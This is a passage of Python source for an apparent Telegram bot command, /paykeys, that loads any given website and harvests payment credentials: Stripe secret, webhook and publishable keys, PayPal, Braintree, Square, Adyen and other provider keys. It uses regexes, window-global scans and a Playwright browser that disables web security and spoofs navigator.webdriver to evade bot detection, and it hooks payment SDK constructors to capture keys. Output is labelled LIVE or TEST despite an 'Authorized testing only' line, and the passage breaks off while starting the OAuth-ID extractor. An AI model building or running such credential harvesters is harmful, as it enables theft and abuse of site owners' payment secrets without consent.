    # ── Mollie — require "mollie" keyword (avoid "live_" prefix mismatches) ──
    ("Mollie API Key",              re.compile(r'(?i)mollie[_-]?(?:api[_-]?)?key\s*[=:]\s*["\']?((?:live|test)_[A-Za-z0-9]{30,45})["\']?')),
    # ── Klarna ────────────────────────────────────────────────────────────────
    ("Klarna API Username",         re.compile(r'(?i)klarna[_-]?(?:api[_-]?)?username\s*[=:]\s*["\']([A-Za-z0-9_\-@.]{5,60})["\']')),
    # ── Checkout.com ──────────────────────────────────────────────────────────
    ("Checkout.com Public Key",     re.compile(r'\b(pk_(?:sbox|prod)_[A-Za-z0-9]{20,80})\b')),
    # ── Shopify — require "shopify" keyword ───────────────────────────────────
    ("Shopify Store Domain",        re.compile(r'(?i)shopify[_-]?(?:store[_-]?)?domain\s*[=:]\s*["\']([a-z0-9-]+\.myshopify\.com)["\']')),
    # ── Stripe PaymentIntent secret ───────────────────────────────────────────
    ("PaymentIntent client secret", re.compile(r'\b(pi_[A-Za-z0-9]{24}_secret_[A-Za-z0-9]{24})\b')),
]

def _validate_payment_key(key_type: str, key_value: str) -> bool:
    """Secondary validation to filter false positives after regex match."""
    v = key_value.strip()
    kt = key_type.lower()

    # ── Stripe ────────────────────────────────────────────────────────────────
    if "stripe publishable" in kt:
        return bool(re.match(r'^pk_(live|test)_[A-Za-z0-9]{20,60}$', v))
    if "stripe secret" in kt:
        return bool(re.match(r'^sk_(live|test)_[A-Za-z0-9]{20,60}$', v))
    if "stripe webhook" in kt:
        return bool(re.match(r'^whsec_[A-Za-z0-9]{20,60}$', v))
    if "stripe restricted" in kt:
        return bool(re.match(r'^rk_(live|test)_[A-Za-z0-9]{20,60}$', v))

    # ── PayPal ────────────────────────────────────────────────────────────────
    if "paypal" in kt:
        return v.startswith('A') and 48 <= len(v) <= 101

    # ── Braintree ─────────────────────────────────────────────────────────────
    if "braintree" in kt:
        if re.match(r'^(pk_|cr_|tb_)', v):
            return True
        if re.match(r'^[a-f0-9]{32}$', v):
            return True
        return len(v) >= 20

    # ── Square ────────────────────────────────────────────────────────────────
    if "square app" in kt:
        return bool(re.match(r'^sq0idp-[A-Za-z0-9_-]{22,43}$', v))
    if "square access" in kt:
        return bool(re.match(r'^sq0atp-[A-Za-z0-9_-]{22,43}$', v))

    # ── Razorpay ──────────────────────────────────────────────────────────────
    if "razorpay" in kt:
        return bool(re.match(r'^rzp_(live|test)_[A-Za-z0-9]{14,20}$', v))

    # ── Mollie ────────────────────────────────────────────────────────────────
    if "mollie" in kt:
        return bool(re.match(r'^(live|test)_[A-Za-z0-9]{30,45}$', v))

    # ── WooCommerce ───────────────────────────────────────────────────────────
    if "woocommerce consumer key" in kt:
        return bool(re.match(r'^ck_[a-f0-9]{40}$', v))
    if "woocommerce consumer secret" in kt:
        return bool(re.match(r'^cs_[a-f0-9]{40}$', v))

    # ── Adyen ─────────────────────────────────────────────────────────────────
    if "adyen" in kt:
        return 20 <= len(v) <= 80 and bool(re.match(r'^[A-Za-z0-9_-]+$', v))

    # ── Checkout.com ──────────────────────────────────────────────────────────
    if "checkout.com" in kt:
        return bool(re.match(r'^pk_(sbox|prod)_[A-Za-z0-9]{20,80}$', v))

    # ── Shopify ───────────────────────────────────────────────────────────────
    if "shopify" in kt:
        return v.endswith('.myshopify.com') and bool(re.match(r'^[a-z0-9-]+\.myshopify\.com$', v))

    # ── PaymentIntent ─────────────────────────────────────────────────────────
    if "paymentintent" in kt:
        return bool(re.match(r'^pi_[A-Za-z0-9]{24}_secret_[A-Za-z0-9]{24}$', v))

    # Default: pass through unknowns
    return True


_PAY_JS_EVAL = """() => {
    const res = {};

    // ── Stripe: extract publishable key from internal state ──
    try {
        if (window.Stripe) {
            res['Stripe_loaded'] = 'true';
            // Stripe.js v3 stores key here after init
            if (window.Stripe._apiKey) res['Stripe._apiKey'] = window.Stripe._apiKey;
        }
    } catch(e) {}

    // ── Payment SDK globals (v18: added Klarna, Adyen, Checkout, Mollie, Gatsby/Vue/Nuxt variants) ──
    const sdkKeys = [
        'stripePublishableKey', 'STRIPE_PUBLISHABLE_KEY',
        'NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY', 'REACT_APP_STRIPE_KEY',
        'stripe_publishable_key', 'stripe_key', 'stripeKey',
        'paypal_client_id', 'PAYPAL_CLIENT_ID', 'paypalClientId',
        'braintreeToken', 'braintree_token', 'clientToken',
        'squareAppId', 'square_app_id', 'SQUARE_APP_ID',
        'razorpayKeyId', 'razorpay_key_id', 'RAZORPAY_KEY_ID',
        'checkoutPublicKey', 'CHECKOUT_PUBLIC_KEY',
        'mollieProfileId', 'MOLLIE_PROFILE_ID',
        'paddleVendorId', 'PADDLE_VENDOR_ID',
        // v18: Klarna
        'klarnaClientId', 'KLARNA_CLIENT_ID', 'klarna_client_id',
        'klarnaPublicKey', 'KLARNA_PUBLIC_KEY',
        // v18: Adyen
        'adyenClientKey', 'ADYEN_CLIENT_KEY', 'adyen_client_key',
        'adyenOriginKey', 'ADYEN_ORIGIN_KEY',
        // v18: Checkout.com
        'checkoutComPublicKey', 'CHECKOUT_COM_PUBLIC_KEY',
        // v18: Mollie
        'MOLLIE_API_KEY', 'mollie_api_key',
        // v18: Gatsby / Vue / Nuxt env variants
        'GATSBY_STRIPE_PUBLIC_KEY', 'GATSBY_PAYPAL_CLIENT_ID',
        'VUE_APP_STRIPE_KEY', 'VUE_APP_STRIPE_PUBLISHABLE_KEY',
        'VUE_APP_PAYPAL_CLIENT_ID',
        'NUXT_STRIPE_KEY', 'NUXT_PUBLIC_STRIPE_KEY',
        'NUXT_PAYPAL_CLIENT_ID',
    ];
    sdkKeys.forEach(k => {
        try {
            const v = window[k];
            if (v && typeof v === 'string' && v.length > 5)
                res[k] = v;
        } catch(e) {}
    });

    // ── Framework configs: __NEXT_DATA__, __NUXT__, etc. ──
    const envSources = [
        ['__NEXT_DATA__', window.__NEXT_DATA__],
        ['__NUXT__', window.__NUXT__],
        ['__ENV__', window.__ENV__],
        ['_env_', window._env_],
        ['appConfig', window.appConfig],
        ['siteConfig', window.siteConfig],
        ['wpApiSettings', window.wpApiSettings],
        ['give_global_vars', window.give_global_vars],
        ['giveVars', window.giveVars],
        ['wc_stripe_params', window.wc_stripe_params],
        ['wc_square_params', window.wc_square_params],
        ['wc_braintree_cart_params', window.wc_braintree_cart_params],
    ];
    envSources.forEach(([k, v]) => {
        if (!v) return;
        try {
            const s = typeof v === 'string' ? v : JSON.stringify(v);
            if (s && s.length > 5) res[k] = s.substring(0, 3000);
        } catch(e) {}
    });

    // ── v18: __NEXT_DATA__ element parse — extract env object for payment keys ──
    try {
        const ndEl = document.getElementById('__NEXT_DATA__');
        if (ndEl && ndEl.textContent) {
            const nd = JSON.parse(ndEl.textContent);
            const envObj = (nd && nd.props && nd.props.pageProps && nd.props.pageProps.env)
                        || (nd && nd.runtimeConfig)
                        || (nd && nd.env)
                        || {};
            Object.entries(envObj).forEach(([k, v]) => {
                const kl = k.toLowerCase();
                if ((kl.includes('stripe') || kl.includes('paypal') || kl.includes('pay') ||
                     kl.includes('klarna') || kl.includes('adyen') || kl.includes('checkout') ||
                     kl.includes('mollie') || kl.includes('publishable') || kl.includes('client_id')) &&
                     typeof v === 'string' && v.length > 5) {
                    res['__NEXT_DATA__.env:' + k] = v;
                }
            });
        }
    } catch(e) {}

    // ── v18: window.__ENV__ / window._env_ / window.ENV / window.APP_CONFIG / window.appConfig / window.config / window.settings ──
    const configKeys = ['__ENV__', '_env_', 'ENV', 'APP_CONFIG', 'appConfig', 'config', 'settings'];
    configKeys.forEach(ck => {
        try {
            const obj = window[ck];
            if (!obj || typeof obj !== 'object') return;
            Object.entries(obj).forEach(([k, v]) => {
                const kl = k.toLowerCase();
                if ((kl.includes('stripe') || kl.includes('paypal') || kl.includes('pay') ||
                     kl.includes('klarna') || kl.includes('adyen') || kl.includes('checkout') ||
                     kl.includes('mollie') || kl.includes('publishable') || kl.includes('client_id') ||
                     kl.includes('braintree') || kl.includes('square') || kl.includes('razorpay')) &&
                     typeof v === 'string' && v.length > 5 && v.length < 300) {
                    res[ck + ':' + k] = v;
                }
            });
        } catch(e) {}
    });

    // ── Scan all window keys for payment-related strings ──
    Object.keys(window).forEach(k => {
        try {
            const kl = k.toLowerCase();
            if (kl.includes('stripe') || kl.includes('paypal') ||
                kl.includes('payment') || kl.includes('checkout') ||
                kl.includes('razorpay') || kl.includes('braintree') ||
                kl.includes('publishable') || kl.includes('client_id') ||
                kl.includes('klarna') || kl.includes('adyen') || kl.includes('mollie')) {
                const v = window[k];
                if (typeof v === 'string' && v.length > 5 && v.length < 500)
                    res['win:' + k] = v;
                else if (typeof v === 'object' && v !== null) {
                    try { res['win:' + k] = JSON.stringify(v).substring(0, 500); } catch(e) {}
                }
            }
        } catch(e) {}
    });

    // ── iframe srcs (Stripe Elements, PayPal iframe) ──
    const iframeData = [];
    document.querySelectorAll('iframe').forEach(f => {
        const src = f.src || '';
        const name = f.name || f.id || '';
        if (src.length > 5) iframeData.push(src.substring(0, 300) + '||' + name);
    });
    if (iframeData.length) res['__iframes__'] = JSON.stringify(iframeData);

    // ── v18: data attributes on page (added [data-stripe] and [data-publishable-key]) ──
    const dataAttrs = {};
    document.querySelectorAll('[data-key],[data-publishable-key],[data-client-id],[data-stripe-key],[data-paypal-client-id],[data-stripe],[data-publishable-key]').forEach(el => {
        ['data-key','data-publishable-key','data-client-id','data-stripe-key',
         'data-paypal-client-id','data-stripe','data-publishable-key'].forEach(attr => {
            const v = el.getAttribute(attr);
            if (v && v.length > 5) dataAttrs[attr + ':' + el.tagName] = v;
        });
    });
    if (Object.keys(dataAttrs).length) res['__data_attrs__'] = JSON.stringify(dataAttrs);

    return res;
}"""

# ── v18: Playwright-based dynamic payment key interceptor ─────────────────
def _paykeys_playwright(url: str, progress_cb=None) -> dict:
    """
    Phase 2 — Enhanced payment key interceptor.
    New in v22:
      + Stripe publishableKey extracted directly from network request URL
        query-string (?publishableKey=pk_live_xxx) — catches keys before
        any JS eval runs.
      + PaymentRequest API constructor hook — captures methodData passed
        to new PaymentRequest() including supportedMethods and data fields.
      + Square Web Payments SDK init hook — captures Square.payments(appId).
      + Adyen checkout.create() hook — captures clientKey + environment.
      + Braintree client.create({authorization}) hook.
      + Broader lazy-load trigger: click [data-stripe], scroll, hover
        pay buttons — forces deferred SDK inits to fire.
    Returns {stripe_keys, paypal_client_ids, payment_request_hits,
             square_hits, adyen_hits, braintree_hits, response_hits, _engine}
    """
    result = {
        "stripe_keys":          [],
        "paypal_client_ids":    [],
        "payment_request_hits": [],   # NEW: PaymentRequest API captures
        "square_hits":          [],   # NEW: Square SDK
        "adyen_hits":           [],   # NEW: Adyen checkout
        "braintree_hits":       [],   # NEW: Braintree
        "response_hits":        [],
        "_engine":              "none",
    }
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        result["_engine"] = "playwright_not_installed"
        return result

    _PAY_KEY_RE    = re.compile(r'\b(pk_(?:live|test)_[A-Za-z0-9]{20,120})\b')
    _PAYPAL_RE     = re.compile(r'[?&]client-id=([A-Za-z0-9_\-]{10,120})')
    _PK_URL_RE     = re.compile(r'[?&]publishableKey=(pk_(?:live|test)_[A-Za-z0-9]{20,120})')
    _stripe_seen   = set()
    _paypal_seen   = set()
    _pr_seen       = set()
    _square_seen   = set()
    _adyen_seen    = set()
    _braintree_seen = set()

    # ── JS hooks injected before page scripts run ────────────────────────────
    # Hooks PaymentRequest, Square, Adyen, Braintree constructors/methods.
    # Results stored in window.__payHook so Python can retrieve them.
    _INIT_HOOKS = """
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
window.chrome = {runtime: {}};
window.__payHook = {
    paymentRequests: [],
    squareInits: [],
    adyenInits: [],
    braintreeInits: []
};

// ── PaymentRequest constructor hook ──────────────────────────────────────
(function() {
    const _OrigPR = window.PaymentRequest;
    if (!_OrigPR) return;
    window.PaymentRequest = function(methodData, details, options) {
        try {
            window.__payHook.paymentRequests.push({
                methodData: JSON.stringify(methodData).substring(0, 2000),
                total: details && details.total ? JSON.stringify(details.total) : ''
            });
        } catch(e) {}
        return new _OrigPR(methodData, details, options);
    };
    window.PaymentRequest.prototype = _OrigPR.prototype;
})();

// ── Square Web Payments SDK hook ──────────────────────────────────────────
(function() {
    const _squarePoll = setInterval(function() {
        if (window.Square && window.Square.payments && !window.__squareHooked) {
            window.__squareHooked = true;
            const _origPayments = window.Square.payments.bind(window.Square);
            window.Square.payments = function(appId, locationId) {
                try {
                    window.__payHook.squareInits.push({
                        appId: appId || '',
                        locationId: locationId || ''
                    });
                } catch(e) {}
                return _origPayments(appId, locationId);
            };
            clearInterval(_squarePoll);
        }
    }, 200);
    setTimeout(() => clearInterval(_squarePoll), 15000);
})();

// ── Adyen checkout.create() hook ──────────────────────────────────────────
(function() {
    const _adyenPoll = setInterval(function() {
        if ((window.AdyenCheckout || (window.Adyen && window.Adyen.AdyenCheckout))
                && !window.__adyenHooked) {
            window.__adyenHooked = true;
            const AdyenCls = window.AdyenCheckout || window.Adyen.AdyenCheckout;
            const _origCreate = AdyenCls.prototype && AdyenCls.prototype.create
                              ? AdyenCls.prototype.create.bind(AdyenCls.prototype)
                              : null;
            if (_origCreate) {
                AdyenCls.prototype.create = function(type, opts) {
                    try {
                        window.__payHook.adyenInits.push({
                            type: type || '',
                            clientKey: (opts && opts.clientKey) || '',
                            environment: (opts && opts.environment) || ''
                        });
                    } catch(e) {}
                    return _origCreate.call(this, type, opts);
                };
            }
            clearInterval(_adyenPoll);
        }
    }, 200);
    setTimeout(() => clearInterval(_adyenPoll), 15000);
})();

// ── Braintree client.create() hook ───────────────────────────────────────
(function() {
    const _btPoll = setInterval(function() {
        if (window.braintree && window.braintree.client && !window.__btHooked) {
            window.__btHooked = true;
            const _origCreate = window.braintree.client.create.bind(
                                    window.braintree.client);
            window.braintree.client.create = function(opts, cb) {
                try {
                    window.__payHook.braintreeInits.push({
                        authorization: (opts && opts.authorization) || ''
                    });
                } catch(e) {}
                return _origCreate(opts, cb);
            };
            clearInterval(_btPoll);
        }
    }, 200);
    setTimeout(() => clearInterval(_btPoll), 15000);
})();
"""

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox", "--disable-dev-shm-usage",
                    "--disable-blink-features=AutomationControlled",
                    "--disable-web-security",
                ]
            )
            ctx = browser.new_context(
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/122.0.0.0 Safari/537.36"
                ),
                viewport={"width": 1366, "height": 768},
                ignore_https_errors=True,
            )
            # Inject hooks before ANY page script runs
            ctx.add_init_script(_INIT_HOOKS)
            page = ctx.new_page()

            # ── Network request hook ─────────────────────────────────────────
            def _on_request(req):
                ru = req.url
                # NEW: Stripe JS load URL — extract publishableKey from query string
                if "js.stripe.com" in ru:
                    m = _PK_URL_RE.search(ru)
                    if m and m.group(1) not in _stripe_seen:
                        _stripe_seen.add(m.group(1))
                        key = m.group(1)
                        result["stripe_keys"].append({
                            "value":  key,
                            "source": f"Stripe JS request URL: {ru[:120]}",
                            "env":    "🔴 LIVE" if "pk_live_" in key else "🟡 TEST",
                            "method": "url_query_param",
                        })
                        if progress_cb:
                            progress_cb(f"💳 Stripe key (URL): {key[:24]}...")
                # PayPal SDK URL: extract client-id param
                if "paypal.com/sdk/js" in ru:
                    m = _PAYPAL_RE.search(ru)
                    if m and m.group(1) not in _paypal_seen:
                        _paypal_seen.add(m.group(1))
                        result["paypal_client_ids"].append({
                            "value":  m.group(1),
                            "source": f"PayPal SDK request URL: {ru[:120]}",
                        })
                        if progress_cb:
                            progress_cb(f"💳 PayPal client-id: {m.group(1)[:20]}...")

            # ── Response body hook ───────────────────────────────────────────
            def _on_response(resp):
                ru = resp.url
                ct = resp.headers.get("content-type", "").lower()
                if not any(x in ct for x in ("javascript", "json", "text/plain")):
                    return
                if resp.status != 200:
                    return
                try:
                    body = resp.body().decode("utf-8", errors="ignore")
                    # Stripe pk_ key anywhere in response body
                    for m in _PAY_KEY_RE.finditer(body):
                        key = m.group(1)
                        if key not in _stripe_seen:
                            _stripe_seen.add(key)
                            result["stripe_keys"].append({
                                "value":  key,
                                "source": f"Response body: {ru[:120]}",
                                "env":    "🔴 LIVE" if "pk_live_" in key else "🟡 TEST",
                                "method": "response_body_scan",
                            })
                            if progress_cb:
                                progress_cb(f"💳 Stripe key (body): {key[:24]}...")
                    # Collect body snippet for any payment keyword hit
                    if any(kw in body for kw in (
                        "pk_live_", "pk_test_", "client-id", "braintree",
                        "squareup", "rzp_live_", "adyenClientKey", "clientKey",
                    )):
                        result["response_hits"].append({
                            "url":  ru[:120],
                            "body": body[:1500],
                        })
                except Exception:
                    pass

            page.on("request",  _on_request)
            page.on("response", _on_response)

            if progress_cb:
                progress_cb("🌐 Loading page for payment key interception...")
            try:
                page.goto(url, wait_until="domcontentloaded", timeout=30_000)
            except Exception:
                pass

            try:
                page.wait_for_load_state("networkidle", timeout=10_000)
            except Exception:
                pass

            # ── Scroll to trigger lazy-loaded payment widgets ────────────────
            try:
                page.evaluate("window.scrollTo(0, document.body.scrollHeight / 2)")
                page.wait_for_timeout(800)
                page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                page.wait_for_timeout(800)
            except Exception:
                pass

            # ── Focus / hover payment elements — trigger deferred SDK init ───
            trigger_selectors = [
                '[data-stripe]',
                '[data-testid*="pay"]',
                '.payment-button',
                '#place-order',
                'button[name="commit"]',
                '[class*="payment"]',
                '[class*="checkout"]',
                'button[class*="pay"]',
                '.stripe-button-el',
                '#stripe-button',
                '.braintree-hosted-fields-invalid',
                '[id*="square"]',
                '[class*="adyen"]',
                'form[action*="checkout"]',
            ]
            for sel in trigger_selectors:
                try:
                    el = page.query_selector(sel)
                    if el and el.is_visible():
                        el.scroll_into_view_if_needed()
                        page.wait_for_timeout(250)
                        el.hover()
                        page.wait_for_timeout(250)
                        el.focus()
                        page.wait_for_timeout(300)
                except Exception:
                    pass

            # Final wait for deferred SDK inits
            page.wait_for_timeout(2000)

            # ── Collect hooked constructor results ───────────────────────────
            try:
                hook_data = page.evaluate("() => window.__payHook || {}")

                # PaymentRequest hits
                for pr in (hook_data.get("paymentRequests") or []):
                    key = pr.get("methodData", "")[:80]
                    if key and key not in _pr_seen:
                        _pr_seen.add(key)
                        result["payment_request_hits"].append(pr)
                        if progress_cb:
                            progress_cb(f"💳 PaymentRequest captured: {key[:40]}...")

                # Square hits
                for sq in (hook_data.get("squareInits") or []):
                    app_id = sq.get("appId", "")
                    if app_id and app_id not in _square_seen:
                        _square_seen.add(app_id)
                        result["square_hits"].append(sq)
                        if progress_cb:
                            progress_cb(f"💳 Square appId: {app_id[:30]}...")

                # Adyen hits
                for ad in (hook_data.get("adyenInits") or []):
                    ck = ad.get("clientKey", "")
                    if ck and ck not in _adyen_seen:
                        _adyen_seen.add(ck)
                        result["adyen_hits"].append(ad)
                        if progress_cb:
                            progress_cb(f"💳 Adyen clientKey: {ck[:30]}...")

                # Braintree hits
                for bt in (hook_data.get("braintreeInits") or []):
                    auth = bt.get("authorization", "")
                    if auth and auth not in _braintree_seen:
                        _braintree_seen.add(auth)
                        result["braintree_hits"].append(bt)
                        if progress_cb:
                            progress_cb(f"💳 Braintree auth: {auth[:30]}...")

            except Exception:
                pass

            browser.close()

    except Exception as e:
        result["_engine"] = f"error: {e}"
        return result

    result["_engine"] = "playwright_v22"
    return result


def _paykeys_sync(url: str, progress_cb=None) -> dict:
    data = _extract_run(url, _PAY_JS_EVAL, progress_cb)
    if data.get("error"):
        return {"error": data["error"], "findings": [], "page_url": url}

    # ── Option B: Deep asset fetch (Option A handled by _paykeys_playwright) ─
    if progress_cb: progress_cb("📦 Deep asset fetch for payment keys...")
    new_assets = _deep_asset_fetch(url, data.get("network_log", []), progress_cb)
    data       = _merge_dynamic_into_data(data, {}, new_assets)

    findings = []
    seen = set()

    def _add(t, v, src):
        """Add finding with validation to reduce false positives."""
        v = v.strip()
        d = t + ":" + v[:80]
        if d not in seen and len(v) >= 6:
            if not _validate_payment_key(t, v):
                return  # filtered by post-match validation
            seen.add(d)
            findings.append({"type": t, "value": v, "source": src})

    if progress_cb: progress_cb("🔍 Scanning HTML + JS bundles...")

    # ── 1. HTML + all JS bundle bodies ──
    for text, label in _gather_all_text(data):
        for key_type, pat in _PAY_PATTERNS:
            for m in pat.finditer(text):
                val = m.group(1) if m.lastindex else m.group(0)
                _add(key_type, val.strip(), label)

    if progress_cb: progress_cb("🔍 Scanning window globals + DOM...")

    # ── 2. window globals (flat string scan) ──
    for k, v in (data.get("dom_result") or {}).items():
        s = str(v)
        for key_type, pat in _PAY_PATTERNS:
            for mm in pat.finditer(s):
                val = mm.group(1) if mm.lastindex else mm.group(0)
                _add(key_type, val, f"window/{k}")

    # ── 3. iframe src URL query params ──
    if progress_cb: progress_cb("🔍 Scanning iframe payment URLs...")
    dom = data.get("dom_result") or {}
    iframe_json = dom.get("__iframes__", "[]")
    try:
        iframes = json.loads(iframe_json) if isinstance(iframe_json, str) else []
        for entry in iframes:
            src = entry.split("||")[0] if "||" in entry else entry
            # Stripe Elements iframe: ?publishableKey=pk_live_xxx
            for key_type, pat in _PAY_PATTERNS:
                for mm in pat.finditer(src):
                    val = mm.group(1) if mm.lastindex else mm.group(0)
                    _add(key_type, val, f"iframe src: {src[:80]}")
    except Exception:
        pass

    # ── 4. __NEXT_DATA__ / __NUXT__ deep JSON scan ──
    for env_key in ("__NEXT_DATA__", "__NUXT__", "__ENV__", "_env_",
                    "give_global_vars", "wc_stripe_params", "wc_square_params"):
        env_str = str((data.get("dom_result") or {}).get(env_key, ""))
        if env_str and len(env_str) > 10:
            for key_type, pat in _PAY_PATTERNS:
                for mm in pat.finditer(env_str):
                    val = mm.group(1) if mm.lastindex else mm.group(0)
                    _add(key_type, val, f"{env_key} (framework config)")

    # ── 5. v18: Dynamic Playwright interception (Stripe response + PayPal SDK URL) ──
    dyn = {"stripe_keys": [], "paypal_client_ids": [], "_engine": "none"}
    if PLAYWRIGHT_OK:
        if progress_cb: progress_cb("🌐 Dynamic payment interception (Playwright)...")
        try:
            dyn = _paykeys_playwright(url, progress_cb)
        except Exception as _dyn_err:
            logger.debug("_paykeys_playwright error: %s", _dyn_err)

    # Merge Stripe keys from dynamic scan
    for sk in dyn.get("stripe_keys", []):
        _add("Stripe Publishable Key (dynamic)", sk["value"], sk.get("source", "Playwright"))

    # Merge PayPal client-ids from dynamic scan
    for pp in dyn.get("paypal_client_ids", []):
        _add("PayPal Client ID (SDK URL)", pp["value"], pp.get("source", "Playwright"))

    return {
        "error":    None,
        "findings": findings,
        "page_url": data["page_url"],
        "requests": len(data.get("network_log", [])),
        "js_count": sum(1 for e in data.get("network_log",[]) if ".js" in e["url"]),
        "dynamic":  dyn,
    }


async def cmd_paykeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/paykeys <url> — Extract Stripe, PayPal, Braintree, Square, Razorpay payment keys"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/paykeys https://example.com`\n\n"
            "💳 *Detects:*\n"
            "  • Stripe publishable/secret/restricted keys\n"
            "  • PayPal Client ID\n"
            "  • Braintree tokenization key\n"
            "  • Square, Razorpay, Klarna, Mollie\n"
            "  • WooCommerce consumer key/secret\n"
            "  • Checkout.com, Adyen, Paddle\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith("http"): url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"💳 *Payment Key Extractor — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"💳 *Payment Keys — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_paykeys_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown')
        return
    findings = result["findings"]; page_url = result["page_url"]
    if not findings:
        await msg.edit_text(
            f"💳 *Payment Key Extractor — `{domain}`*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📭 No payment keys found\n🌐 `{page_url}`", parse_mode='Markdown')
        return
    lines = [f"💳 *Payment Keys — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"🌐 `{page_url}`", f"✅ Found: `{len(findings)}`\n"]
    for i, f in enumerate(findings, 1):
        env = "🔴 LIVE" if ("live" in f["value"].lower() or "prod" in f["value"].lower()) else "🟡 TEST"
        lines.append(f"*[{i}] {f['type']}* {env}")
        lines.append(f"  `{f['value'][:80]}`")
        lines.append(f"  _📂 {f['source'][:60]}_\n")
    lines.append("━━━━━━━━━━━━━━━━━━\n⚠️ _Authorized testing only_")
    report = "\n".join(lines)
    try:
        if len(report) <= 4000: await msg.edit_text(report, parse_mode='Markdown')
        else: await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
    import io as _io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=_io.BytesIO(json.dumps({"domain": domain, "page_url": page_url,
                "scanned_at": datetime.now().isoformat(), "findings": findings},
                indent=2, ensure_ascii=False).encode()),
            filename=f"paykeys_{safe_d}_{ts}.json",
            caption=f"💳 Payment Keys — `{domain}` — `{len(findings)}` found",
            parse_mode='Markdown')
    except Exception as e:
        logger.warning("paykeys export error: %s", e)


# ══════════════════════════════════════════════════
# 👤  4. /socialkeys — OAuth & Social Login IDs
# ══════════════════════════════════════════════════

_SOCIAL_PATTERNS = [
    ("Google Client ID",        re.compile(r'\b(\d{10,20}-[a-z0-9]{32}\.apps\.googleusercontent\.com)\b')),
    ("Google OAuth Client ID",  re.compile(r'(?i)(?:google|oauth|client).{0,20}id.{0,10}[=:\s]["\']?(\d{10,20}-[a-z0-9]+\.apps\.googleusercontent\.com)')),
    ("Facebook App ID",         re.compile(r'(?i)(?:facebook|fb).{0,20}(?:app.{0,5}id|appid).{0,10}[=:\s]["\']?(\d{10,20})\b')),
    ("Facebook Pixel ID",       re.compile(r'(?i)(?:fbq|fb.{0,10}pixel).{0,30}["\']?(\d{10,20})["\']?')),
    ("Apple Client ID",         re.compile(r'(?i)apple.{0,20}(?:client.{0,5}id|service.{0,5}id).{0,10}[=:\s]["\']([A-Za-z0-9.]{5,60})["\']')),
    ("Apple Team ID",           re.compile(r'(?i)apple.{0,20}team.{0,5}id.{0,10}[=:\s]["\']?([A-Z0-9]{10})\b')),
    ("GitHub OAuth App ID",     re.compile(r'(?i)github.{0,20}client.{0,5}id.{0,10}[=:\s]["\']([A-Za-z0-9]{20})["\']')),
    ("Twitter/X Consumer Key",  re.compile(r'(?i)twitter.{0,20}(?:consumer|api).{0,5}key.{0,10}[=:\s]["\']([A-Za-z0-9]{25,35})["\']')),
    ("LinkedIn Client ID",      re.compile(r'(?i)linkedin.{0,20}client.{0,5}id.{0,10}[=:\s]["\']([A-Za-z0-9]{14})["\']')),
    ("Discord Client ID",       re.compile(r'(?i)discord.{0,20}client.{0,5}id.{0,10}[=:\s]["\']?(\d{17,19})\b')),
    ("Discord Bot Token",       re.compile(r'\b([A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,38})\b')),
    ("Spotify Client ID",       re.compile(r'(?i)spotify.{0,20}client.{0,5}id.{0,10}[=:\s]["\']([a-f0-9]{32})["\']')),
    ("Amazon Cognito Pool",     re.compile(r'\b([a-z]{2}-[a-z]{4,9}-[12]_[A-Za-z0-9]{9})\b')),
    ("Auth0 Domain",            re.compile(r'(?i)auth0.{0,20}domain.{0,10}[=:\s]["\']([a-z0-9\-]+\.(?:us|eu|au)\.auth0\.com)["\']')),
    ("Auth0 Client ID",         re.compile(r'(?i)auth0.{0,20}client.{0,5}id.{0,10}[=:\s]["\']([A-Za-z0-9]{32,64})["\']')),
    ("Okta Client ID",          re.compile(r'(?i)okta.{0,20}client.{0,5}id.{0,10}[=:\s]["\']([A-Za-z0-9]{20,40})["\']')),
    ("Microsoft App ID",        re.compile(r'(?i)(?:azure|microsoft|ms).{0,20}(?:client|app).{0,5}id.{0,10}[=:\s]["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']')),
]

_SOCIAL_JS_EVAL = """() => {
    const res = {};
    const srcs = [...document.querySelectorAll('script[src]')].map(s=>s.src);
    // Google sign-in meta
    document.querySelectorAll('meta[name="google-signin-client_id"]').forEach(m=>{
        res['google_signin_meta'] = m.content;
    });
    // FB init call
    try { if (window.FB && window.FB.getLoginStatus) res['FB_loaded'] = 'true'; } catch(e){}
    // Apple ID
